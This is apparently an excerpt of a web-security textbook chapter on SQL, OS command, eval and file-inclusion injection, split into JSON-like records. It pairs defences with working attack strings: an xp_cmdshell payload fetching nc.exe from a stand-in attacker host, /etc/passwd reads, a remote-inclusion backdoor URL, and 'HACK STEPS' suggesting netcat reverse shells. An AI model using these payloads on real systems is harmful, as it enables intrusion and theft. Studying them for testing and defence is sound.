exploitable! If you entered a single quote and\nit altered the syntax of the database query, this is the error\nyou’d expect.\nFor MySQL, SQL injection may well be present, but the same\nerror message can appear in other contexts.\nOracle: PLS-00306: wrong number or types of arguments\nin call to ‘XXX’\nMS-SQL: Procedure ‘XXX’ expects parameter ‘@YYY’,\nwhich was not supplied\nMySQL: N/A\nTranslation: You have commented out or removed a variable that would\nnormally be supplied to the database. In MS-SQL, you should\nbe able to use time delay enumeration to perform arbitrary\ndata retrieval.\nOracle: ORA-01789: query block has incorrect number of\nresult columns\nMS-SQL: Msg 205, Level 16, State 1, Line 1\nAll queries in an SQL statement containing a\nUNION operator must have an equal number of\nexpressions in their target lists.\nMySQL: The used SELECT statements have a different\nnumber of columns\nTranslation: You will see this when you are attempting a UNION SELECT\nattack, and you have specified a different number of columns\nto the number in the original SELECTstatement.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 293\nChapter 9 ■ Injecting Code 293\nOracle: ORA-01790: expression must have same datatype\nas corresponding expression\nMS-SQL: Msg 245, Level 16, State 1, Line 1\nSyntax error converting the varchar value\n‘foo’ to a column of data type int.\nMySQL: (MySQL will not give you an error.)\nTranslation: You will see this when you are attempting a UNION SELECT\nattack, and you have specified a different data type from that\nfound in the original SELECTstatement. Try using a NULL, or\nusing 1or 2000.\nOracle: ORA-01722: invalid number\nORA-01858: a non-numeric character was found\nwhere a numeric was expected\nMS-SQL: Msg 245, Level 16, State 1, Line 1\nSyntax error converting the varchar value\n‘foo’ to a column of data type int.\nMySQL: (MySQL will not give you an error.)\nTranslation: Your input doesn’t match the expected data type for the field.\nYou may have SQL Injection, and you may not need a single\nquote, so try simply entering a number followed by your SQL\nto be injected.\nIn MS-SQL, you should be able to return any string value with\nthis error message.\nOracle: ORA-00923: FROM keyword not found where\nexpected\nMS-SQL: N/A\nMySQL: N/A\nTranslation: The following will work in MS-SQL:\nSELECT 1\nBut in Oracle, if you want to return something, you must\nselect from a table. The DUALtable will do fine:\nSELECT 1 from DUAL\nOracle: ORA-00936: missing expression\nMS-SQL: Msg 156, Level 15, State 1, Line 1\nIncorrect syntax near the keyword ‘from’.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 294\n294 Chapter 9 ■ Injecting Code\nMySQL: You have an error in your SQL syntax. Check\nthe manual that corresponds to your MySQL\nserver version for the right syntax to use\nnear ‘ XXX , YYY from SOME_TABLE’ at line 1\nTranslation: You commonly see this error message when your injection\npoint occurs before the FROMkeyword (for example, you have\ninjected into the columns to be returned) and/or you have\nused the comment character to remove required SQL\nkeywords.\nTry completing the SQL statement yourself while using your\ncomment character.\nMySQL should helpfully reveal the column names XXX, YYY\nwhen this condition is encountered.\nOracle: ORA-00972: identifier is too long\nMS-SQL: String or binary data would be truncated.\nMySQL: N/A\nTranslation: This does not indicate SQL injection. You may see this error\nmessage if you have entered a long string. You’re not likely to\nget a buffer overflow here either, as the database is handling\nyour input safely.\nOracle: ORA-00942: table or view does not exist\nMS-SQL: Msg 208, Level 16, State 1, Line 1\nInvalid object name ‘foo’\nMySQL: Table ‘DBNAME.SOMETABLE’ doesn’t exist\nTranslation: Either you are trying to access a table or view that does not\nexist, or in the case of Oracle, the database user does not\nhave privileges for the table or view. Test your query against a\ntable you know you have access to, such as DUAL.\nMySQL should helpfully reveal the current database schema\nDBNAMEwhen this condition is encountered.\nOracle: ORA-00920: invalid relational operator\nMS-SQL: Msg 170, Level 15, State 1, Line 1\nLine 1: Incorrect syntax near foo\nMySQL: You have an error in your SQL syntax. Check\nthe manual that corresponds to your MySQL\nserver version for the right syntax to use\nnear ‘’ at line 1\nTranslation: You were probably altering something in a WHEREclause, and\nyour SQL injection attempt has disrupted the grammar.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 295\nChapter 9 ■ Injecting Code 295\nOracle: ORA-00907: missing right parenthesis\nMS-SQL: N/A\nMySQL: You have an error in your SQL syntax. Check\nthe manual that corresponds to your MySQL\nserver version for the right syntax to use\nnear ‘’ at line 1\nTranslation: Your SQL injection attempt has worked, but the injection point\nwas inside parentheses ( ). You probably commented out the\nclosing parenthesis with injected comment characters --.\nOracle: ORA-00900: invalid SQL statement\nMS-SQL: Msg 170, Level 15, State 1, Line 1\nLine 1: Incorrect syntax near foo\nMySQL: You have an error in your SQL syntax. Check\nthe manual that corresponds to your MySQL\nserver version for the right syntax to use\nnear XXXXXX\nTranslation: A general error message. The error messages listed previously\nall take precedence, so something else went wrong. It’s likely\nyou can try alternative input and get a more meaningful\nmessage.\nOracle: ORA-03001: unimplemented feature\nMS-SQL: N/A\nMySQL: N/A\nTranslation: You have tried to perform an action that Oracle does not\nallow. This can happen if you were trying to display the\ndatabase version string from v$versionbut you were in an\nUPDATEor INSERTquery.\nOracle: ORA-02030: can only select from fixed\ntables/views\nMS-SQL: N/A\nMySQL: N/A\nTranslation: You were probably trying to edit a SYSTEMview. This can\nhappen if you were trying to display the database version\nstring from v$versionbut you were in an UPDATEor\nINSERTquery\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 296\n296 Chapter 9 ■ Injecting Code\nPreventing SQL Injection\nDespite all of its different manifestations, and the complexities that can arise in\nits exploitation, SQL injection is in general one of the easier vulnerabilities to\nprevent. Nevertheless, discussion about SQL injection countermeasures is fre-\nquently misleading, and many people rely upon defensive measures that are\nonly partially effective.\nPartially Effective Measures\nBecause of the prominence of the single quotation mark in the standard expla-\nnations of SQL injection flaws, a common approach to preventing attacks is to\nescape any single quotation marks within user input by doubling them up.\nYou have already seen two situations in which this approach fails:\n■■ If numeric user-supplied data is being embedded into SQL queries, this\nis not normally encapsulated within single quotation marks. Hence, an\nattacker can break out of the data context and begin entering arbitrary\nSQL, without the need to supply a single quotation mark.\n■■ In second-order SQL injection attacks, data that has been safely escaped\nwhen initially inserted into the database is subsequently read from the\ndatabase and then passed back to it again. Quotation marks that have\nbeen doubled up initially will return to their original form when the\ndata is reused.\nAnother countermeasure that is often cited is the use of stored procedures\nfor all database access. There is no doubt that custom stored procedures can\nprovide security and performance benefits; however, they are not guaranteed\nto prevent SQL injection vulnerabilities, for two reasons:\n■■ As you saw in the case of Oracle, a poorly written stored procedure can\ncontain SQL injection vulnerabilities within its own code. Similar secu-\nrity issues arise when constructing SQL statements within stored proce-\ndures as do elsewhere, and the fact that a stored procedure is being\nused does not prevent flaws from arising.\n■■ Even if a robust stored procedure is being used, SQL injection vulnera-\nbilities can arise if it is invoked in an unsafe way using user-supplied\ninput. For example, suppose that a user registration function is imple-\nmented within a stored procedure, which is invoked as follows:\nexec sp_RegisterUser ‘joe’, ‘secret’\nThis statement may be just as vulnerable as a simple INSERTstatement.\nFor example, an attacker may supply the following password:\nfoo’; exec master..xp_cmdshell ‘tftp wahh-attacker.com GET nc.exe’--\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 297\nChapter 9 ■ Injecting Code 297\nwhich causes the application to perform the following batch query:\nexec sp_RegisterUser ‘joe’, ‘foo’; exec master..xp_cmdshell ‘tftp\nwahh-attacker.com GET nc.exe’--‘\nand so the use of the stored procedure has achieved nothing.\nIn fact, in a large and complex application that performs thousands of dif-\nferent SQL statements, many developers regard the solution of re-implement-\ning these statements as stored procedures to be an unjustifiable overhead on\ndevelopment time.\nParameterized Queries\nMost databases and application development platforms provide APIs for han-\ndling untrusted input in a secure way which prevents SQL injection vulnera-\nbilities from arising. In parameterized queries (also known as prepared\nstatements), the construction of a SQL statement containing user input is per-\nformed in two steps:\n1. The application specifies the structure of the query, leaving placehold-\ners for each item of user input.\n2. The application specifies the contents of each placeholder.\nCrucially, there is no way in which crafted data that is specified at the sec-\nond step can interfere with the structure of the query specified in the first step.\nBecause the query structure has already been defined, the relevant API han-\ndles any type of placeholder data in a safe manner, and so it is always inter-\npreted as data rather than part of the statement’s structure.\nThe following two code samples illustrate the difference between an\nunsafe query dynamically constructed out of user data, and its safe parame-\nterized counterpart. In the first, the user-supplied name parameter is embed-\nded directly into a SQL statement, leaving the application vulnerable to SQL\ninjection:\n//define the query structure\nString queryText = “select ename,sal from emp where ename =’“;\n//concatenate the user-supplied name\nqueryText += request.getParameter(“name”);\nqueryText += “‘“;\n// execute the query\nstmt = con.createStatement();\nrs = stmt.executeQuery(queryText);\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 298\n298 Chapter 9 ■ Injecting Code\nIn the second example, the query structure is defined using a question mark\nas a placeholder for the user-supplied parameter. The prepareStatement\nmethod is invoked to interpret this, and fix the structure of the query that is to\nbe executed. Only then is the setString method used to specify the actual\nvalue of the parameter. Because the query’s structure has already been fixed,\nthis value can contain any data at all, without affecting the structure. The\nquery is then executed safely:\n//define the query structure\nString queryText = “SELECT ename,sal FROM EMP WHERE ename = ?”;\n//prepare the statement through DB connection “con”\nstmt = con.prepareStatement(queryText);\n//add the user input to variable 1 (at the first ? placeholder)\nstmt.setString(1, request.getParameter(“name”));\n// execute the query\nrs = stmt.executeQuery();\nNOTE The precise methods and syntax for creating parameterized queries\ndiffer among databases and application development platforms. See Chapter 18\nfor more details about the most common examples.\nIf parameterized queries are to be an effective solution against SQL injec-\ntion, then there are three important provisos to bear in mind:\n■■ They should be used for every database query. The authors have\nencountered many applications where the developers made a judgment\nin each case whether or not to use a parameterized query. In cases\nwhere user-supplied input was clearly being used, they did so; other-\nwise, they didn’t bother. This approach has been the cause of many SQL\ninjection flaws. First, by focusing only on input that has been immedi-\nately received from the user, it is easy to overlook second-order attacks\nbecause data that has already been processed is assumed to be trusted.\nSecond, it is easy to make mistakes about the specific cases in which the\ndata being handled is user-controllable. In a large application, different\nitems of data will be held within the session or received from the client.\nAssumptions made by one developer may not be communicated to oth-\ners. The handling of specific data items may change in the future, intro-\nducing a SQL injection flaw into previously safe queries. It is much\nsafer to take the approach of mandating the use of parameterized\nqueries throughout the application.\n■■ Every item of data inserted into the query should be properly parame-\nterized. The authors have encountered numerous cases where most of a\nquery’s parameters are handled safely; however, one or two items are\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 299\nChapter 9 ■ Injecting Code 299\nconcatenated directly into the string used to specify the query structure.\nThe use of parameterized queries will not prevent SQL injection if some\nparameters are handled in this way.\n■■ Parameter placeholders cannot be used to specify the table and column\nnames used in the query. In some very rare cases, applications need to\nspecify these items within an SQL query on the basis of user-supplied\ndata. In this situation, the best approach is to use a white list of known\ngood values (i.e., the list of tables and columns actually used within the\ndatabase) and reject any input that does not match an item on this list.\nFailing this, strict validation should be enforced on the user input—for\nexample, allowing only alphanumeric characters, excluding white-\nspace, and enforcing a suitable length limit.\nDefense in Depth\nAs always, a robust approach to security should employ defense-in-depth\nmeasures to provide additional protection in the event that front-line defenses\nfail for any reason. In the context of attacks against back-end databases, there\nare three layers of further defense that can be employed:\n■■ The application should use the lowest possible level of privileges when\naccessing the database. In general, the application does not need DBA-\nlevel permissions—it normally only needs to read and write its own\ndata. In security-critical situations, the application may employ a differ-\nent database account for performing different actions. For example, if\n90% of its database queries only require read access, then these can be\nperformed using an account which does not have write privileges. If a\nparticular query only needs to read a subset of data (for example, the\norders table, but not the user accounts table), then an account with the\ncorresponding level of access can be used. If this approach is enforced\nthroughout the application, then any residual SQL injection flaws that\nmay exist are likely to have their impact significantly reduced.\n■■ Many enterprise databases include a huge amount of default function-\nality that can be leveraged by an attacker who gains the ability to\nexecute arbitrary SQL statements. Wherever possible, unnecessary\nfunctions should be removed or disabled. Even though there are cases\nwhere a skilled and determined attacker may be able to recreate some\nrequired functions through other means, this task is not usually\nstraightforward, and the database hardening will still place significant\nobstacles in the way of the attacker.\n■■ All vendor-issued security patches should be evaluated, tested, and\napplied in a timely way, to fix known vulnerabilities within the database\nsoftware itself. In security-critical situations, database administrators can"
  },
  {
    "input": "Injecting OS Commands",
    "output": "70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 300\n300 Chapter 9 ■ Injecting Code\nuse various subscriber-based services to obtain advance notification of\nsome known vulnerabilities that have not yet been patched by the ven-\ndor, and so can implement appropriate work-around measures in the\ninterim.\nInjecting OS Commands\nMost web server platforms have evolved to the point where built-in APIs exist\nto perform practically any required interaction with the server’s operating sys-\ntem. Properly used, these APIs can enable developers to access the file system,\ninterface with other processes, and carry out network communications in a\nsafe manner. Nevertheless, there are many situations where developers elect to\nuse the more heavyweight technique of issuing operating system commands\ndirectly to the server. This option can be attractive because of its power and\nsimplicity, and often provides an immediate and functional solution to a par-\nticular problem. However, if the application passes user-supplied input to\noperating system commands, then it may well be vulnerable to command\ninjection, enabling an attacker to submit crafted input that modifies the com-\nmands that the developers intended to perform.\nThe functions commonly used to issue operating system commands, such as\nexecin PHP and wscript.shellin ASP, do not impose any restriction on the\nscope of commands that may be performed. Even if a developer intends to use\nan API to perform a relatively benign task such as listing a directory’s con-\ntents, an attacker may be able to subvert it to write arbitrary files or launch\nother programs. Any injected commands will normally run in the security con-\ntext of the web server process, which will often be sufficiently powerful for an\nattacker to compromise the entire server.\nCommand injection flaws of this kind have arisen in numerous off-the-shelf\nand custom-built web applications. They have been particularly prevalent\nwithin applications that provide an administrative interface to an enterprise\nserver or to devices such as firewalls, printers, and routers. These applications\noften have particular requirements for operating system interaction that lead\ndevelopers to use direct commands which incorporate user-supplied data.\nExample 1: Injecting via Perl\nConsider the following Perl CGI code, which is part of a web application for\nserver administration. This function allows administrators to specify a direc-\ntory on the server, and view a summary of its disk usage:\n#!/usr/bin/perl\nuse strict;\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 301\nChapter 9 ■ Injecting Code 301\nuse CGI qw(:standard escapeHTML);\nprint header, start_html(“”);\nprint “<pre>”;\nmy $command = “du -h --exclude php* /var/www/html”;\n$command= $command.param(“dir”);\n$command=`$command`;\nprint “$command\\n”;\nprint end_html;\nWhen used as intended, this script simply appends the value of the user-\nsupplied dir parameter to the end of a preset command, executes the com-\nmand, and displays the results, as shown in Figure9-3.\nFigure9-3: A simple application function for listing a directory’s contents\nThis functionality can be exploited in various ways, by supplying crafted\ninput containing shell metacharacters. These characters have a special mean-\ning to the interpreter that processes the command and can be used to interfere\nwith the command that the developer intended to execute. For example, the\npipe character |is used to redirect the output from one process into the input\nof another, enabling multiple commands to be chained together. An attacker\ncan leverage this behavior to inject a second command and retrieve its output,\nas shown in Figure9-4.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 302\n302 Chapter 9 ■ Injecting Code\nFigure9-4: A successful command injection attack\nHere, the output from the original du command has been redirected as the\ninput to the command cat /etc/passwd. This command simply ignores the\ninput and performs its sole task of outputting the contents of the passwdfile.\nAn attack as simple as this may appear improbable; however, exactly this\ntype of command injection has been found in numerous commercial products.\nFor example, HP Openview was found to be vulnerable to a command injec-\ntion flaw within the following URL:\nhttps://target:3443/OvCgi/connectedNodes.ovpl?node=a| [your command] |\nExample 2: Injecting via ASP\nConsider the following ASP code, which is part of a web application for\nadministering a web server. The function allows administrators to view the\ncontents of a requested log file:\n<%\nSet oScript = Server.CreateObject(“WSCRIPT.SHELL”)\nSet oFileSys = Server.CreateObject(“Scripting.FileSystemObject”)\nszCMD = “type c:\\inetpub\\wwwroot\\logs\\“ & Request.Form(“FileName”)\nszTempFile = “C:\\“ & oFileSys.GetTempName()\nCall oScript.Run (“cmd.exe /c “ & szCMD & “ > “ & szTempFile,\n0, True)\nSet oFile = oFileSys.OpenTextFile (szTempFile, 1, False, 0)\n%>\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 303\nChapter 9 ■ Injecting Code 303\nWhen used as intended, this script inserts the value of the user-supplied\nFileNameparameter into a preset command, executes the command, and dis-\nplays the results, as shown in Figure9-5.\nFigure9-5: A function to display the contents of a log file\nAs with the vulnerable Perl script, an attacker can use shell metacharacters\nto interfere with the preset command intended by the developer, and inject his\nown command. The ampersand character (&) is used to batch multiple com-\nmands together. Supplying a filename containing the ampersand character\nand a second command causes this command to be executed and its results\ndisplayed, as shown in Figure9-6.\nFigure9-6: A successful command injection attack\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 304\n304 Chapter 9 ■ Injecting Code\nFinding OS Command Injection Flaws\nIn your application mapping exercises (see Chapter 4), you should already\nhave identified any instances where the web application appears to be inter-\nacting with the underlying operating system, by calling out to external\nprocesses or accessing the file system. You should probe all of these functions\nlooking for command injection flaws. In fact, however, the application may\nissue operating system commands containing absolutely any item of user-\nsupplied data, including every URL and body parameter and every cookie. To\nperform a thorough test of the application, you therefore need to target all\nthese items within every application function.\nDifferent command interpreters handle shell metacharacters in different\nways. In principle, any type of application development platform or web server\nmay call out to any kind of shell interpreter, running either on its own operating\nsystem or that of any other host. You should not therefore make any assump-\ntions about the application’s handling of metacharacters based on any knowl-\nedge of the web server’s operating system.\nThere are two broad types of metacharacter that may be used to inject a sep-\narate command into an existing preset command:\n■■ The characters ; | &and newline may be used to batch multiple com-\nmands together, one after the other. In some cases, these characters may\nbe doubled up with different effects. For example in the Windows com-\nmand interpreter, using &&will cause the second command to run only\nif the first is successful. Using ||will cause the second command to\nalways run, regardless of the success of the first.\n■■ The backtick character (`) can be used to encapsulate a separate com-\nmand within a data item being processed by the original command, as\nin the example given at the beginning of this chapter. Placing an injected\ncommand within backticks will cause the shell interpreter to execute the\ncommand and replace the encapsulated text with the results of this com-\nmand, before continuing to execute the resulting command string.\nIn the previous examples, it was straightforward to verify that command\ninjection was possible, and to retrieve the results of the injected command,\nbecause those results were returned immediately within the application’s\nresponse. In many cases, however, this may not be possible. You may be inject-\ning into a command that returns no results and which does not affect the appli-\ncation’s subsequent processing in any identifiable way. Or the method you\nhave used to inject your chosen command may be such that its results are lost\nas multiple commands are batched together.\nThe most reliable way in general to detect whether command injection is\npossible is to use time-delay inference in a similar way as was described for\nexploiting blind SQL injection. If a potential vulnerability appears to exist, you\ncan then use other methods to confirm this and to retrieve the results of your\ninjected commands.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 305\nChapter 9 ■ Injecting Code 305\nHACK STEPS\n■ You can normally use the pingcommand as a means of triggering a time\ndelay, by causing the server to ping its loopback interface for a specific\nperiod. There are minor differences between the way Windows and Unix-\nbased platforms handle command separators and the pingcommand,\nbut the following all-purpose test string should induce a 30-second time\ndelay on either platform if no filtering is in place:\n|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 &\nTo maximize your chances of detecting a command injection flaw if the\napplication is filtering certain command separators, you should also submit\neach of the following test strings to each targeted parameter in turn, and\nmonitor the time taken for the application to respond:\n| ping –i 30 127.0.0.1 |\n| ping –n 30 127.0.0.1 |\n& ping –i 30 127.0.0.1 &\n& ping –n 30 127.0.0.1 &\n; ping 127.0.0.1 ;\n%0a ping –i 30 127.0.0.1 %0a\n` ping 127.0.0.1 `\n■ If a time delay occurs, then the application may be vulnerable to com-\nmand injection. Repeat the test case several times to confirm that the\ndelay was not the result of network latency or other anomalies. You can\ntry changing the value of the -nor -iparameters, and confirming that\nthe delay experienced varies systematically with the value supplied.\n■ Using whichever of the injection strings was found to be successful, try\ninjecting a more interesting command (such as lsor dir), and deter-\nmine whether you are able to retrieve the results of the command back\nto your browser.\n■ If you are unable to retrieve results directly, there are other options open\nto you:\n■ You can attempt to open an out-of-band channel back to your com-\nputer. Try using TFTP to copy tools up to the server, using telnet or net-\ncat to create a reverse shell back to your computer, and using the\nmailcommand to send command output via SMTP.\n■ You can redirect the results of your commands to a file within the web\nroot, which you can then retrieve directly using your browser. For\nexample:\ndir > c:\\inetpub\\wwwroot\\foo.txt\nContinued\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 306\n306 Chapter 9 ■ Injecting Code\nHACK STEPS (continued)\n■ Once you have found a means of injecting commands and retrieving the\nresults, you should determine your privilege level (by using whoamior\nsomething similar, or attempting to write a harmless file to a protected\ndirectory). You may then seek to escalate privileges, gain backdoor\naccess to sensitive application data, or attack other hosts reachable from\nthe compromised server.\nIn some cases, it may not be possible to inject an entirely separate command,\ndue to filtering of required characters, or the behavior of the command API\nbeing used by the application. Nevertheless, it may still be possible to interfere\nwith the behavior of the command being performed, to achieve some desired\nresult.\nHACK STEPS\n■ The <and >characters are used respectively to direct the contents of a\nfile to the command’s input and to direct the command’s output to a file.\nIf it is not possible to use the preceding techniques to inject an entirely\nseparate command, you may still be able to read and write arbitrary file\ncontents using the <and >characters.\n■ Many operating system commands which applications invoke accept a\nnumber of command-line parameters that control their behavior. Often,\nuser-supplied input is passed to the command as one of these parame-\nters, and you may be able to add further parameters simply by inserting a\nspace followed by the relevant parameter. For example, a web authoring\napplication may contain a function in which the server retrieves a user-\nspecified URL and renders its contents in-browser for editing. If the\napplication simply calls out to the wgetprogram, then you may be able\nto write arbitrary file contents to the server’s file system by appending\nthe -Ocommand-line parameter used by wget. For example:\nurl=http://wahh-attacker.com/%20-O%20c:\\inetpub\\wwwroot\\\nscripts\\cmdasp.asp\nTIP Many command injection attacks require you to inject spaces to separate\ncommand-line arguments. If you find that spaces are being filtered by the\napplication, and the platform you are attacking is Unix-based, you may be able\nto use the $IFSenvironment variable instead, which contains the whitespace\nfield separators."
  },
  {
    "input": "Injecting into Web Scripting Languages",
    "output": "70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 307\nChapter 9 ■ Injecting Code 307\nPreventing OS Command Injection\nIn general, the best way to prevent OS command injection flaws from arising\nis to avoid calling out directly to operating system commands at all. Virtually\nany conceivable task that a web application may need to carry out can be\nachieved using built-in APIs that cannot be manipulated to perform additional\ncommands than the one intended.\nIf it is considered unavoidable to embed user-supplied data into command\nstrings that are passed to an operating system command interpreter, the appli-\ncation should enforce rigorous defenses to prevent a vulnerability arising. If\npossible, a white list should be used to restrict user input to a specific set of\nexpected values. Alternatively, the input should be restricted to a very narrow\ncharacter set—for example, alphanumeric characters only. Input containing\nany other data, including any conceivable metacharacter or whitespace should\nbe rejected.\nAs a further layer of protection, the application should use command APIs\nthat launch a specific process via its name and command-line parameters,\nrather than passing a command string to a shell interpreter that supports com-\nmand chaining and redirection. For example, the Java API Runtime.execand\nthe ASP.NET API Process.Start do not support shell metacharacters and if\nproperly used can ensure that only the command intended by the developer\nwill be executed. See Chapter 18 for more details of command execution APIs.\nInjecting into Web Scripting Languages\nThe core logic of most web applications is written in interpreted scripting lan-\nguages like PHP, VBScript, and Perl. In addition to the possibilities for inject-\ning into languages used by other back-end components, a key area of\nvulnerability concerns injection into the core application code itself. Exposure\nto this type of attack arises from two main sources:\n■■ Dynamic execution of code that incorporates user-supplied data.\n■■ Dynamic inclusion of code files specified on the basis of user-\nsupplied data.\nWe will look at each of these vulnerabilities in turn.\nDynamic Execution Vulnerabilities\nMany web scripting languages support the dynamic execution of code that is\ngenerated at runtime. This feature enables developers to create applications\nthat dynamically modify their own code in response to various data and con-\nditions. If user input is incorporated into code that is dynamically executed,\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 308\n308 Chapter 9 ■ Injecting Code\nthen an attacker may be able to supply crafted input that breaks out of the\nintended data context and specifies commands that are executed on the server\nin the same way as if they had been written by the original developer. Because\nmost scripting languages contain powerful APIs that may be used to access the\nunderlying operating system, code injection into the web application often\nleads to a compromise of the entire server.\nDynamic Execution in PHP\nThe PHP function evalis used to dynamically execute code that is passed to the\nfunction at runtime. Consider a search function that enables users to create stored\nsearches that are then dynamically generated as links within their user interface.\nWhen users access the search function, they use a URL like the following:\nhttps://wahh-app.com/search.php?storedsearch=\\$mysearch%3dwahh\nThe server-side application implements this functionality by dynamically gen-\nerating variables containing the name/value pairs specified in the storedsearch\nparameter, in this case creating a mysearchvariable with the value wahh:\n$storedsearch = $_GET[‘storedsearch’];\neval(“$storedsearch;”);\nIn this situation, you can submit crafted input that is dynamically executed\nby the eval function, resulting in injection of arbitrary PHP commands into\nthe server-side application. The semicolon character can be used to batch com-\nmands together in a single parameter. For example, to retrieve the contents of\nthe file /etc/password, you could use either the file_get_contents or the\nsystemcommand:\nhttps://wahh-app.com/search.php?storedsearch=\\$mysearch%3dwahh;\n%20echo%20file_get_contents(‘/etc/passwd’)\nhttps://wahh-app.com/search.php?storedsearch=\\$mysearch%3dwahh;\n%20system(‘cat%20/etc/passwd’)\nNOTE The Perl language also contains an evalfunction that can be exploited\nin the same way. Note that the semicolon character may need to be URL-encoded\n(as %3b) as some CGI script parsers interpret this as a parameter delimiter.\nDynamic Execution in ASP\nThe ASP function Execute works in the same way as the PHP eval function\nand can be used to dynamically execute code that is passed to the function at\nruntime.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 309\nChapter 9 ■ Injecting Code 309\nThe functionality described for the PHP application above could be imple-\nmented in ASP as follows:\ndim storedsearch\nstoredsearch = Request(“storedsearch”)\nExecute(storedsearch)\nIn this situation, an attacker can submit crafted input which results in injec-\ntion of arbitrary ASP commands. In ASP, commands are normally delimited\nusing newline characters, but multiple commands can be batched when\npassed to the Execute function using the colon character. For example,\nresponse.writecan be used to print arbitrary data into the server’s response:\nhttps://wahh-app.com/search.asp?storedsearch=mysearch%3dwahh:\nresponse.write%20111111111\nThe Wscript.Shellobject can be used to access the operating system com-\nmand shell. For example, the following ASP will perform a directory listing\nand store the results in a file within the web root:\nDim oScript\nSet oScript = Server.CreateObject(“WSCRIPT.SHELL”)\nCall oScript.Run (“cmd.exe /c dir > c:\\inetpub\\wwwroot\\dir.txt”,0,True)\nThis code can be passed to the vulnerable call to Executeby batching all of\nthe commands as follows:\nhttps://wahh-app.com/search.asp?storedsearch=mysearch%3dwahh:+\nDim +oScript:+Set+oScript+=+Server.CreateObject(“WSCRIPT.SHELL”):+\nCall+oScript.Run+(“cmd.exe+/c+dir+>+c:\\inetpub\\wwwroot\\dir.txt”,0,True)\nFinding Dynamic Execution Vulnerabilities\nMost web scripting languages support dynamic execution, and the functions\ninvolved all work in a similar way. Therefore, dynamic execution vulnerabili-\nties can in general be detected using a relatively small set of attack strings that\nwork on multiple languages and platforms. However, in some cases it may be\nnecessary to research the syntax and behavior of the particular implementa-\ntion you are dealing with. For example, although Java does not itself support\ndynamic execution, some custom implementations of the JSP platform may do\nso. You should use the information gathered during your application mapping\nexercises to investigate any unusual execution environments you encounter.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 310\n310 Chapter 9 ■ Injecting Code\nHACK STEPS\n■ Any item of user-supplied data may be passed to a dynamic execution\nfunction. Some of the items most commonly used in this way are the\nnames and values of cookie parameters, and persistent data stored in\nuser profiles as the result of previous actions.\n■ Try submitting the following values in turn as each targeted parameter:\n;echo%20111111\necho%20111111\nresponse.write%20111111\n:response.write%20111111\n■ Review the application’s responses. If the string 111111is returned on\nits own (i.e., not preceded by the rest of the command string), then the\napplication is likely to be vulnerable to injection of scripting commands.\n■ If the string 111111is not returned, look for any error messages that\nindicate that your input is being dynamically executed and that you may\nneed to fine-tune your syntax to achieve injection of arbitrary commands.\n■ If the application you are attacking uses PHP, you can use the test string\nphpinfo(), which if successful will return the configuration details of\nthe PHP environment.\n■ If the application appears to be vulnerable, verify this by injecting some\ncommands that result in time delays, as described previouslyfor OS com-\nmand injection. For example:\nsystem(‘ping%20127.0.0.1’)\nFile Inclusion Vulnerabilities\nMany scripting languages support the use of include files. This facility enables\ndevelopers to place reusable code components into individual files, and to\ninclude these within function-specific code files as and when they are needed.\nThe code within the included file is interpreted just as if it had been inserted at\nthe location of the include directive.\nRemote File Inclusion\nThe PHP language is particularly susceptible to file inclusion vulnerabilities\nbecause its include function accepts a remote file path. This has been the basis\nof numerous vulnerabilities in PHP applications.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 311\nChapter 9 ■ Injecting Code 311\nConsider an application that delivers different content to people in different\nlocations. When users choose their location, this is communicated to the server\nvia a request parameter, as follows:\nhttps://wahh-app.com/main.php?Country=US\nThe application processes the Countryparameter as follows:\n$country = $_GET[‘Country’];\ninclude( $country . ‘.php’ );\nThis causes the execution environment to load the file US.phpthat is located\non the web server file system. The contents of this file are effectively copied\ninto the main.phpfile, and executed.\nAn attacker can exploit this behavior in different ways, the most serious of\nwhich is to specify an external URL as the location of the include file. The PHP\ninclude function accepts this as input, and the execution environment will\nretrieve the specified file and execute its contents. Hence, an attacker can con-\nstruct a malicious script containing arbitrarily complex content, host this on a\nweb server he controls, and invoke it for execution via the vulnerable applica-\ntion function. For example:\nhttps://wahh-app.com/main.php?Country=http://wahh-attacker.com/backdoor\nLocal File Inclusion\nIn some cases, include files are loaded on the basis of user-controllable data,\nbut it is not possible to specify a URL to a file on an external server. For exam-\nple, if user-controllable data is passed to the ASP function Server.Execute,\nthen an attacker may be able to cause an arbitrary ASP script to be executed,\nprovided that this script belongs to the same application as the one that is call-\ning the function.\nIn this situation, you may still be able to exploit the application’s behavior to\nperform unauthorized actions:\n■■ There may be server-executable files on the server that you cannot\naccess through the normal route—for example, any requests to the\npath /adminmay be blocked through application-wide access controls.\nIf you can cause sensitive functionality to be included into a page that\nyou are authorized to access, then you may be able to gain access to\nthat functionality.\n■■ There may be static resources on the server that are similarly protected\nfrom direct access. If you can cause these to be dynamically included\ninto other application pages, then the execution environment will typi-\ncally simply copy the contents of the static resource into its response.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 312\n312 Chapter 9 ■ Injecting Code\nFinding File Inclusion Vulnerabilities\nFile inclusion vulnerabilities may arise in relation to any item of user-supplied\ndata. They are particularly common in request parameters that specify a lan-\nguage or location, and also often arise when the name of a server-side file is\npassed explicitly as a parameter.\nHACK STEPS\nTo test for remote file inclusion flaws, perform the following steps:\n■ Submit in each targeted parameter a URL for a resource on a web server\nthat you control, and determine whether any requests are received from\nthe server hosting the target application.\n■ If the first test fails, try submitting a URL containing a nonexistent IP\naddress, and determine whether a timeout occurs while the server\nattempts to connect.\n■ If the application is found to be vulnerable to remote file inclusion, con-\nstruct a malicious script using the available APIs in the relevant lan-\nguage, as described for dynamic 